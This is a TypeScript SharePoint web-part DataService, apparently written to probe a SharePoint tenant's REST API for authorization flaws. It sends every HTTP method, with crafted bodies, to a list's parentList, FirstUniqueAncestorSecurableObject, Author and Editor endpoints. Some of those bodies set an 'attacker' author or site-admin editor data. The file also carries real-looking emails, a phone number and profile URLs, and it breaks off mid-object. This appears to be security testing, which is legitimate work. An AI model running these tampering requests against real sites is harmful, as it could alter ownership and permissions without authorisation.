//        xhr.setRequestHeader("X-RequestDigest", localStorage.getItem('reqd')??"*");
/* eslint-disable */
/* eslint-disable @typescript-eslint/explicit-function-return-type */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-async-promise-executor */
/* eslint-disable @typescript-eslint/no-empty-function*/
/* eslint-disable max-lines */
/* eslint-disable prefer-const */
/* eslint-disable @typescript-eslint/no-non-null-assertion */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable no-unused-expressions */
/* eslint-disable @typescript-eslint/no-floating-promises */
/* eslint-disable react/self-closing-comp */
/* eslint-disable no-void */
/* eslint-disable @typescript-eslint/explicit-function-return-type */
/* eslint-disable @rushstack/security/no-unsafe-regexp */
/* eslint-disable max-lines */
//* eslint-disable no-useless-concat */
/* eslint-disable no-useless-escape */
/* eslint-disable @typescript-eslint/no-non-null-assertion */
/* eslint-disable @typescript-eslint/no-floating-promises */
/* eslint-disable no-unused-expressions */
/* eslint-disable @typescript-eslint/explicit-function-return-type */
/* eslint-disable eqeqeq */
/* eslint-disable react/no-unescaped-entities */
/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable prefer-const */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable react/no-unescaped-entities */
import { PermissionKind, SPFI, spfi, SPFx } from "@pnp/sp/presets/all";
import "@pnp/sp/webs";
import "@pnp/sp/lists";
import "@pnp/sp/items";

import { WebPartContext } from "@microsoft/sp-webpart-base";
import { IWeb, Web } from "@pnp/sp/webs";
import "@pnp/sp/site-users/web";
import "@pnp/sp/fields";

import "@pnp/sp/folders";
import "@pnp/sp/folders/web";
import { createBatch } from "@pnp/sp/batching";
import "@pnp/sp/batching";
import "@pnp/sp/items/list";
// import Constants from "./Constants";
let sp: SPFI;
let webObj: IWeb;
import { CONFIG, sendRequest as sharedSendRequest } from "./config";
import {
  SHAREPOINT_CONSTANTS,
  createPeoplePickerInput,
  // createPeoplePickerInputWithEntity,
  createMentionData,
  createUserData,
} from "./constants";
const {
  lid,
  itemId,
  groupIds,
  principleIds,
  kinds,
  roles,
  roles2,
  listName,
  SITE_URL,
  scope,
  personGroup,
  HTTPMethods,
} = CONFIG;
const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
export default class DataService {
  public constructor(context: WebPartContext) {
    sp = spfi().using(SPFx(context));
    webObj = Web([sp.web, SITE_URL]);
  }
  Test() {
    console.log("Test");
  }

  delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

  List_Item_Info = async () => {
    var body =
      '{"parameters":{"__metadata":{"type":"SP.RenderListDataParameters"},"RenderOptions":267783,"AllowMultipleValueFilterForTaxonomyFields":true,"AddRequiredFields":true}}';
    var body1 =
      '{"parameters":{"__metadata":{"type":"SP.RenderListDataParameters"},"RenderOptions":4098,"OverrideViewXml":"\x3cView\x3e\x3cRowLimit\x3e5000\x3c/RowLimit\x3e\x3c/View\x3e","AllowMultipleValueFilterForTaxonomyFields":true,"AddRequiredFields":true}}';
    this.sendRequest(
      "POST",
      `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/GetList(@v1)/RenderExtendedListFormData(itemId=${itemId},formId='editform',mode='2',options=30,cutoffVersion=0)?@v1=%27%2FLists%2F${listName}%27`
    );
    this.sendRequest(
      "POST",
      `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2FLists%2F${listName}%27&TryNewExperienceSingle=TRUE`,
      body
    );
    this.sendRequest(
      "POST",
      `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2FLists%2F${listName}%27&TryNewExperienceSingle=TRUE`,
      body1
    );
    this.sendRequest2(
      "POST",
      `${SHAREPOINT_CONSTANTS.API_BASE_URL}/web/lists('${lid}')/items(${itemId})/parentList`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
        JSON.stringify({
          ContentTypesEnabled: false,
          CrawlNonDefaultViews: false,
          Created: "2024-12-24T04:47:23Z",
          CurrentChangeToken: {
            StringValue:
              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
          },
          DefaultContentApprovalWorkflowId:
            "00000000-0000-0000-0000-000000000000",
          DefaultItemOpenUseListSetting: false,
          Description: "",
          Direction: "none",
          DisableCommenting: false,
          DisableGridEditing: false,
          DocumentTemplateUrl: null,
          DraftVersionVisibility: 0,
          EnableAttachments: true,
          EnableFolderCreation: true,
          EnableMinorVersions: false,
          EnableModeration: false,
          EnableRequestSignOff: true,
          EnableVersioning: true,
          EntityTypeName: `"${listName}"`,
          ExemptFromBlockDownloadOfNonViewableFiles: false,
          FileSavePostProcessingEnabled: false,
          ForceCheckout: false,
          HasExternalDataSource: false,
          Hidden: false,
          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
          ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
          ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
          DefaultSensitivityLabelForLibrary: "",
          SensitivityLabelToEncryptOnDownloadForLibrary: null,
          IrmEnabled: false,
          IrmExpire: false,
          IrmReject: false,
          IsApplicationList: false,
          IsCatalog: false,
          IsPrivate: false,
          ItemCount: 8,
          LastItemDeletedDate: "2024-12-24T04:47:23Z",
          LastItemModifiedDate: "2024-12-24T04:50:34Z",
          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
          ListExperienceOptions: 0,
          ListItemEntityTypeFullName: `"SP.Data.${listName}ListItem"`,
          MajorVersionLimit: 50,
          MajorWithMinorVersionsLimit: 0,
          MultipleDataList: false,
          NoCrawl: false,
          ParentWebPath: { DecodedUrl: "/sites/test2" },
          ParentWebUrl: "/sites/test2",
          ParserDisabled: false,
          ServerTemplateCanCreateFolders: true,
          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
          Title: "Test",
        })
      );
    });
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
        JSON.stringify({
          ContentTypesEnabled: false,
          CrawlNonDefaultViews: false,
          Created: "2024-12-24T04:47:23Z",
          CurrentChangeToken: {
            StringValue:
              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
          },
          DefaultContentApprovalWorkflowId:
            "00000000-0000-0000-0000-000000000000",
          DefaultItemOpenUseListSetting: false,
          Description: "",
          Direction: "none",
          DisableCommenting: false,
          DisableGridEditing: false,
          DocumentTemplateUrl: null,
          DraftVersionVisibility: 0,
          EnableAttachments: true,
          EnableFolderCreation: true,
          EnableMinorVersions: false,
          EnableModeration: false,
          EnableRequestSignOff: true,
          EnableVersioning: true,
          EntityTypeName: `"${listName}"`,
          ExemptFromBlockDownloadOfNonViewableFiles: false,
          FileSavePostProcessingEnabled: false,
          ForceCheckout: false,
          HasExternalDataSource: false,
          Hidden: false,
          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
          ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
          ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
          DefaultSensitivityLabelForLibrary: "",
          SensitivityLabelToEncryptOnDownloadForLibrary: null,
          IrmEnabled: false,
          IrmExpire: false,
          IrmReject: false,
          IsApplicationList: false,
          IsCatalog: false,
          IsPrivate: false,
          ItemCount: 8,
          LastItemDeletedDate: "2024-12-24T04:47:23Z",
          LastItemModifiedDate: "2024-12-24T04:50:34Z",
          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
          ListExperienceOptions: 0,
          ListItemEntityTypeFullName: `"SP.Data.${listName}ListItem"`,
          MajorVersionLimit: 50,
          MajorWithMinorVersionsLimit: 0,
          MultipleDataList: false,
          NoCrawl: false,
          ParentWebPath: { DecodedUrl: "/" },
          ParentWebUrl: "/",
          ParserDisabled: false,
          ServerTemplateCanCreateFolders: true,
          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
          Title: "Test",
        })
      );
    });
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
        JSON.stringify({
          AllowContentTypes: true,
          BaseTemplate: 100,
          BaseType: 0,
          ContentTypesEnabled: false,
          CrawlNonDefaultViews: false,
          Created: "2024-12-24T11:55:27Z",
          CurrentChangeToken: {
            StringValue:
              "1;3;4ece19a6-8e37-412b-a2e4-3ddef5fe089c;638706421062770000;999068341",
          },
          DefaultContentApprovalWorkflowId:
            "00000000-0000-0000-0000-000000000000",
          DefaultItemOpenUseListSetting: false,
          Description: "",
          Direction: "none",
          DisableCommenting: false,
          DisableGridEditing: false,
          DocumentTemplateUrl: null,
          DraftVersionVisibility: 2,
          EnableAttachments: true,
          EnableFolderCreation: false,
          EnableMinorVersions: false,
          EnableModeration: true,
          EnableRequestSignOff: true,
          EnableVersioning: true,
          EntityTypeName: `"${listName}"`,
          ExemptFromBlockDownloadOfNonViewableFiles: false,
          FileSavePostProcessingEnabled: false,
          ForceCheckout: false,
          HasExternalDataSource: false,
          Hidden: false,
          Id: "4ece19a6-8e37-412b-a2e4-3ddef5fe089c",
          ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
          ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
          DefaultSensitivityLabelForLibrary: "",
          SensitivityLabelToEncryptOnDownloadForLibrary: null,
          IrmEnabled: false,
          IrmExpire: false,
          IrmReject: false,
          IsApplicationList: false,
          IsCatalog: false,
          IsPrivate: false,
          ItemCount: 4,
          LastItemDeletedDate: "2024-12-24T11:55:27Z",
          LastItemModifiedDate: "2024-12-24T12:45:42Z",
          LastItemUserModifiedDate: "2024-12-24T12:45:42Z",
          ListExperienceOptions: 0,
          ListItemEntityTypeFullName: `"SP.Data.${listName}ListItem"`,
          MajorVersionLimit: 50,
          MajorWithMinorVersionsLimit: 0,
          MultipleDataList: false,
          NoCrawl: false,
          ParentWebPath: { DecodedUrl: "/" },
          ParentWebUrl: "/",
          ParserDisabled: false,
          ServerTemplateCanCreateFolders: true,
          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
          Title: "Test",
        })
      );
    });
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
        JSON.stringify({
          AllowRssFeeds: true,
          AlternateCssUrl: "",
          AppInstanceId: "00000000-0000-0000-0000-000000000000",
          ClassicWelcomePage: null,
          Configuration: 0,
          Created: "2024-12-23T12:53:13.77",
          CurrentChangeToken: {
            StringValue:
              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638709731707500000;999929707",
          },
          CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
          Description: "",
          DesignPackageId: "00000000-0000-0000-0000-000000000000",
          DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
          EnableMinimalDownload: false,
          FooterColorIndexInDarkMode: 0,
          FooterColorIndexInLightMode: 0,
          FooterEmphasis: 0,
          FooterEnabled: true,
          FooterLayout: 0,
          HeaderColorIndexInDarkMode: 0,
          HeaderColorIndexInLightMode: 0,
          HeaderEmphasis: 0,
          HeaderLayout: 0,
          HideTitleInHeader: false,
          HorizontalQuickLaunch: false,
          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
          IsEduClass: false,
          IsEduClassProvisionChecked: false,
          IsEduClassProvisionPending: false,
          IsHomepageModernized: false,
          IsMultilingual: true,
          IsRevertHomepageLinkHidden: false,
          Language: 1033,
          LastItemModifiedDate: "2024-12-28T07:34:11Z",
          LastItemUserModifiedDate: "2024-12-27T20:01:52Z",
          LogoAlignment: 0,
          MasterUrl: "/_catalogs/masterpage/seattle.master",
          MegaMenuEnabled: true,
          NavAudienceTargetingEnabled: false,
          NoCrawl: false,
          ObjectCacheEnabled: false,
          OverwriteTranslationsOnChange: false,
          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
          QuickLaunchEnabled: true,
          RecycleBinEnabled: true,
          SearchScope: 0,
          ServerRelativeUrl: "/",
          SiteLogoUrl: null,
          SyndicationEnabled: true,
          TenantAdminMembersCanShare: 0,
          Title: "Communication site",
          TreeViewEnabled: false,
          UIVersion: 15,
          UIVersionConfigurationEnabled: false,
          Url: "https://tmsobb2.sharepoint.com",
          WebTemplate: "SITEPAGEPUBLISHING",
          WelcomePage: "SitePages/Home.aspx",
        })
      );
    });
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
        JSON.stringify({
          AllowContentTypes: true,
          BaseTemplate: 100,
          BaseType: 0,
          ContentTypesEnabled: false,
          CrawlNonDefaultViews: false,
          Created: "2024-12-24T11:55:27Z",
          CurrentChangeToken: {
            StringValue:
              "1;3;4ece19a6-8e37-412b-a2e4-3ddef5fe089c;638706421062770000;999068341",
          },
          DefaultContentApprovalWorkflowId:
            "00000000-0000-0000-0000-000000000000",
          DefaultItemOpenUseListSetting: false,
          Description: "",
          Direction: "none",
          DisableCommenting: false,
          DisableGridEditing: false,
          DocumentTemplateUrl: null,
          DraftVersionVisibility: 2,
          EnableAttachments: true,
          EnableFolderCreation: false,
          EnableMinorVersions: false,
          EnableModeration: true,
          EnableRequestSignOff: true,
          EnableVersioning: true,
          EntityTypeName: `"${listName}"`,
          ExemptFromBlockDownloadOfNonViewableFiles: false,
          FileSavePostProcessingEnabled: false,
          ForceCheckout: false,
          HasExternalDataSource: false,
          Hidden: false,
          Id: "4ece19a6-8e37-412b-a2e4-3ddef5fe089c",
          ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
          ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
          DefaultSensitivityLabelForLibrary: "",
          SensitivityLabelToEncryptOnDownloadForLibrary: null,
          IrmEnabled: false,
          IrmExpire: false,
          IrmReject: false,
          IsApplicationList: false,
          IsCatalog: false,
          IsPrivate: false,
          ItemCount: 4,
          LastItemDeletedDate: "2024-12-24T11:55:27Z",
          LastItemModifiedDate: "2024-12-24T12:45:42Z",
          LastItemUserModifiedDate: "2024-12-24T12:45:42Z",
          ListExperienceOptions: 0,
          ListItemEntityTypeFullName: "SP.Data.TestListItem",
          MajorVersionLimit: 50,
          MajorWithMinorVersionsLimit: 0,
          MultipleDataList: false,
          NoCrawl: false,
          ParentWebPath: { DecodedUrl: "/" },
          ParentWebUrl: "/",
          ParserDisabled: false,
          ServerTemplateCanCreateFolders: true,
          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
          Title: "Test",
        })
      );
    });
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
        JSON.stringify({
          AllowRssFeeds: true,
          AlternateCssUrl: "",
          AppInstanceId: "00000000-0000-0000-0000-000000000000",
          ClassicWelcomePage: null,
          Configuration: 0,
          Created: "2024-12-23T12:53:13.77",
          CurrentChangeToken: {
            StringValue:
              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638709733547870000;999929977",
          },
          CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
          Description: "",
          DesignPackageId: "00000000-0000-0000-0000-000000000000",
          DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
          EnableMinimalDownload: false,
          FooterColorIndexInDarkMode: 0,
          FooterColorIndexInLightMode: 0,
          FooterEmphasis: 0,
          FooterEnabled: true,
          FooterLayout: 0,
          HeaderColorIndexInDarkMode: 0,
          HeaderColorIndexInLightMode: 0,
          HeaderEmphasis: 0,
          HeaderLayout: 0,
          HideTitleInHeader: false,
          HorizontalQuickLaunch: false,
          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
          IsEduClass: false,
          IsEduClassProvisionChecked: false,
          IsEduClassProvisionPending: false,
          IsHomepageModernized: false,
          IsMultilingual: true,
          IsRevertHomepageLinkHidden: false,
          Language: 1033,
          LastItemModifiedDate: "2024-12-28T07:34:11Z",
          LastItemUserModifiedDate: "2024-12-27T20:01:52Z",
          LogoAlignment: 0,
          MasterUrl: "/_catalogs/masterpage/seattle.master",
          MegaMenuEnabled: true,
          NavAudienceTargetingEnabled: false,
          NoCrawl: false,
          ObjectCacheEnabled: false,
          OverwriteTranslationsOnChange: false,
          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
          QuickLaunchEnabled: true,
          RecycleBinEnabled: true,
          SearchScope: 0,
          ServerRelativeUrl: "/",
          SiteLogoUrl: null,
          SyndicationEnabled: true,
          TenantAdminMembersCanShare: 0,
          Title: "Communication site",
          TreeViewEnabled: false,
          UIVersion: 15,
          UIVersionConfigurationEnabled: false,
          Url: "https://tmsobb2.sharepoint.com",
          WebTemplate: "SITEPAGEPUBLISHING",
          WelcomePage: "SitePages/Home.aspx",
        })
      );
    });
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(2)/ContentType`
      );
    });
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Author`,
        JSON.stringify({
          Title: "K Testt",
          PrincipalType: 1,
          Email: "attacker@tmsobb2.onmicrosoft.com",
          Expiration: "",
          IsEmailAuthenticationGuestUser: false,
          IsShareByEmailGuestUser: false,
          IsSiteAdmin: false,
        })
      );
    });

    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Author`,
        JSON.stringify(
          createUserData(
            SHAREPOINT_CONSTANTS.USERS.TMSOBB_EMAIL,
            SHAREPOINT_CONSTANTS.USERS.TMSOBB_NAME,
            SHAREPOINT_CONSTANTS.USERS.TMSOBB_LAST_NAME,
            SHAREPOINT_CONSTANTS.USERS.TMSOBB_WORK_PHONE
          )
        )
      );
    });
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/Web/Lists(guid'${lid}')/Items(${itemId})/Editor`,
        JSON.stringify({
          Id: 11,
          ServerRedirectedEmbedUri: null,
          ServerRedirectedEmbedUrl: "",
          ContentTypeId: "0x010A00A37404FF361E30429BA657CF50DB1989",
          Title: "TMSOBB",
          OData__ColorTag: null,
          ComplianceAssetId: null,
          Name: "i:0#.f|membership|tmsobb@tmsobb2.onmicrosoft.com",
          EMail: "tmsobb@tmsobb2.onmicrosoft.com",
          OtherMail: null,
          UserExpiration: null,
          UserLastDeletionTime: null,
          MobilePhone: null,
          Notes: null,
          SipAddress: "tmsobb@tmsobb2.onmicrosoft.com",
          IsSiteAdmin: true,
          Deleted: false,
          UserInfoHidden: false,
          Picture: {
            Description:
              "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
            Url: "https://tmsobb-my.sharepoint.com:443/User%20Photos/Profile%20Pictures/a188d0ef-798b-40f7-b98d-0b300a6d7da3_MThumb.jpg",
          },
          Department: null,
          JobTitle: null,
          FirstName: "TMSOBB",
          LastName: "Testt",
          WorkPhone: "9075197067",
          UserName: "tmsobb@tmsobb2.onmicrosoft.com",
          WebSite: null,
          SPSResponsibility: null,
          Office: null,
          SPSPictureTimestamp: "63870559229",
          SPSPicturePlaceholderState: 1,
          SPSPictureExchangeSyncState: null,
          SPSUserType: 0,
          ID: 11,
          Modified: "2024-12-24T12:02:18Z",
          Created: "2024-12-23T12:55:38Z",
          AuthorId: 11,
          EditorId: 11,
          OData__UIVersionString: "1.0",
          Attachments: false,
          GUID: "6a7e2b80-b18d-4bc1-a42c-4fd57c51dcbd",
        })
      );
    });
  };
  Library_Item_Info = () => {
    var body =
      '{"parameters":{"__metadata":{"type":"SP.RenderListDataParameters"},"RenderOptions":267783,"AllowMultipleValueFilterForTaxonomyFields":true,"AddRequiredFields":true}}';
    var body1 =
      '{"parameters":{"__metadata":{"type":"SP.RenderListDataParameters"},"RenderOptions":4098,"OverrideViewXml":"\x3cView\x3e\x3cRowLimit\x3e5000\x3c/RowLimit\x3e\x3c/View\x3e","AllowMultipleValueFilterForTaxonomyFields":true,"AddRequiredFields":true}}';
    this.sendRequest(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/GetList(@v1)/RenderExtendedListFormData(itemId=${itemId},formId='editform',mode='2',options=30,cutoffVersion=0)?@v1=%27%2F${listName}%27`
    );
    this.sendRequest(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2F${listName}%27&TryNewExperienceSingle=TRUE`,
      body
    );
    this.sendRequest(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/GetListUsingPath(DecodedUrl=@a1)/RenderListDataAsStream?@a1=%27%2F${listName}%27&TryNewExperienceSingle=TRUE`,
      body1
    );
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
        JSON.stringify({
          ContentTypesEnabled: false,
          CrawlNonDefaultViews: false,
          Created: "2024-12-24T04:47:23Z",
          CurrentChangeToken: {
            StringValue:
              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
          },
          DefaultContentApprovalWorkflowId:
            "00000000-0000-0000-0000-000000000000",
          DefaultItemOpenUseListSetting: false,
          Description: "",
          Direction: "none",
          DisableCommenting: false,
          DisableGridEditing: false,
          DocumentTemplateUrl: null,
          DraftVersionVisibility: 0,
          EnableAttachments: true,
          EnableFolderCreation: true,
          EnableMinorVersions: false,
          EnableModeration: false,
          EnableRequestSignOff: true,
          EnableVersioning: true,
          EntityTypeName: `"${listName}"`,
          ExemptFromBlockDownloadOfNonViewableFiles: false,
          FileSavePostProcessingEnabled: false,
          ForceCheckout: false,
          HasExternalDataSource: false,
          Hidden: false,
          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
          ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
          ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
          DefaultSensitivityLabelForLibrary: "",
          SensitivityLabelToEncryptOnDownloadForLibrary: null,
          IrmEnabled: false,
          IrmExpire: false,
          IrmReject: false,
          IsApplicationList: false,
          IsCatalog: false,
          IsPrivate: false,
          ItemCount: 8,
          LastItemDeletedDate: "2024-12-24T04:47:23Z",
          LastItemModifiedDate: "2024-12-24T04:50:34Z",
          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
          ListExperienceOptions: 0,
          ListItemEntityTypeFullName: `SP.Data.${listName}ListItem`,
          MajorVersionLimit: 50,
          MajorWithMinorVersionsLimit: 0,
          MultipleDataList: false,
          NoCrawl: false,
          ParentWebPath: { DecodedUrl: "/sites/test2" },
          ParentWebUrl: "/sites/test2",
          ParserDisabled: false,
          ServerTemplateCanCreateFolders: true,
          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
          Title: "Test",
        })
      );
    });
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/parentList`,
        JSON.stringify({
          ContentTypesEnabled: false,
          CrawlNonDefaultViews: false,
          Created: "2024-12-24T04:47:23Z",
          CurrentChangeToken: {
            StringValue:
              "1;3;4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b;638706161728670000;998946844",
          },
          DefaultContentApprovalWorkflowId:
            "00000000-0000-0000-0000-000000000000",
          DefaultItemOpenUseListSetting: false,
          Description: "",
          Direction: "none",
          DisableCommenting: false,
          DisableGridEditing: false,
          DocumentTemplateUrl: null,
          DraftVersionVisibility: 0,
          EnableAttachments: true,
          EnableFolderCreation: true,
          EnableMinorVersions: false,
          EnableModeration: false,
          EnableRequestSignOff: true,
          EnableVersioning: true,
          EntityTypeName: `"${listName}"`,
          ExemptFromBlockDownloadOfNonViewableFiles: false,
          FileSavePostProcessingEnabled: false,
          ForceCheckout: false,
          HasExternalDataSource: false,
          Hidden: false,
          Id: "4af2f3f4-28ee-4aae-82a6-bbd98d0d8d0b",
          ImagePath: { DecodedUrl: "/_layouts/15/images/itgen.png?rev=47" },
          ImageUrl: "/_layouts/15/images/itgen.png?rev=47",
          DefaultSensitivityLabelForLibrary: "",
          SensitivityLabelToEncryptOnDownloadForLibrary: null,
          IrmEnabled: false,
          IrmExpire: false,
          IrmReject: false,
          IsApplicationList: false,
          IsCatalog: false,
          IsPrivate: false,
          ItemCount: 8,
          LastItemDeletedDate: "2024-12-24T04:47:23Z",
          LastItemModifiedDate: "2024-12-24T04:50:34Z",
          LastItemUserModifiedDate: "2024-12-24T04:50:34Z",
          ListExperienceOptions: 0,
          ListItemEntityTypeFullName: `SP.Data.${listName}ListItem`,
          MajorVersionLimit: 50,
          MajorWithMinorVersionsLimit: 0,
          MultipleDataList: false,
          NoCrawl: false,
          ParentWebPath: { DecodedUrl: "/" },
          ParentWebUrl: "/",
          ParserDisabled: false,
          ServerTemplateCanCreateFolders: true,
          TemplateFeatureId: "00bfea71-de22-43b2-a848-c05709900100",
          Title: "Test",
        })
      );
    });
    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`
    );
    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/items(${itemId})/FirstUniqueAncestorSecurableObject`,
        JSON.stringify({
          "odata.metadata":
            "https://tmsobb2.sharepoint.com/_api/$metadata#SP.ApiData.Webs/@Element",
          "odata.type": "SP.Web",
          "odata.id": "https://tmsobb2.sharepoint.com/_api/Web",
          "odata.editLink": "Web",
          AllowRssFeeds: true,
          AlternateCssUrl: "",
          AppInstanceId: "00000000-0000-0000-0000-000000000000",
          ClassicWelcomePage: null,
          Configuration: 0,
          Created: "2024-12-23T12:53:13.77",
          CurrentChangeToken: {
            StringValue:
              "1;2;27341d3a-24dc-48fc-ae4e-0a439cf859fd;638750541870370000;1010560322",
          },
          CustomMasterUrl: "/_catalogs/masterpage/seattle.master",
          Description: "",
          DesignPackageId: "00000000-0000-0000-0000-000000000000",
          DocumentLibraryCalloutOfficeWebAppPreviewersDisabled: false,
          EnableMinimalDownload: false,
          FooterColorIndexInDarkMode: 0,
          FooterColorIndexInLightMode: 0,
          FooterEmphasis: 0,
          FooterEnabled: true,
          FooterLayout: 0,
          HeaderColorIndexInDarkMode: 0,
          HeaderColorIndexInLightMode: 0,
          HeaderEmphasis: 0,
          HeaderLayout: 0,
          HideTitleInHeader: false,
          HorizontalQuickLaunch: false,
          Id: "27341d3a-24dc-48fc-ae4e-0a439cf859fd",
          IsEduClass: false,
          IsEduClassProvisionChecked: false,
          IsEduClassProvisionPending: false,
          IsHomepageModernized: false,
          IsMultilingual: true,
          IsRevertHomepageLinkHidden: false,
          Language: 1033,
          LastItemModifiedDate: "2025-02-13T14:35:49Z",
          LastItemUserModifiedDate: "2025-02-13T14:31:02Z",
          LogoAlignment: 0,
          MasterUrl: "/_catalogs/masterpage/seattle.master",
          MegaMenuEnabled: true,
          NavAudienceTargetingEnabled: false,
          NoCrawl: false,
          ObjectCacheEnabled: false,
          OverwriteTranslationsOnChange: false,
          ResourcePath: { DecodedUrl: "https://tmsobb2.sharepoint.com" },
          QuickLaunchEnabled: true,
          RecycleBinEnabled: true,
          SearchScope: 0,
          ServerRelativeUrl: "/",
          SiteLogoUrl: null,
          SyndicationEnabled: true,
          TenantAdminMembersCanShare: 0,
          Title: "Communication site",
          TreeViewEnabled: false,
          UIVersion: 15,
          UIVersionConfigurationEnabled: false,
          Url: "https://tmsobb2.sharepoint.com",
          WebTemplate: "SITEPAGEPUBLISHING",
          WelcomePage: "SitePages/test.aspx",
        })
      );
    });

    this.sendRequest2(
      "POST",
      `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`
    );

    HTTPMethods.map((req: any) => {
      this.sendRequest2(
        req,
        `https://tmsobb2.sharepoint.com/_api/web/lists('${lid}')/FirstUniqueAncestorSecurableObject`,
        JSON.stringify({
          "odata.metadata":
            "https://tmsobb2.sharepoint.com/_api/$metadata#SP.ApiData.Webs/@Element",
          "odata.type": "SP.Web",
          "odata.id": "https://tmsobb2.sharepoint.com/_api/Web",
          "odata.editLink": "Web",
          AllowRssFeeds: true,
          AlternateCssUrl: "",
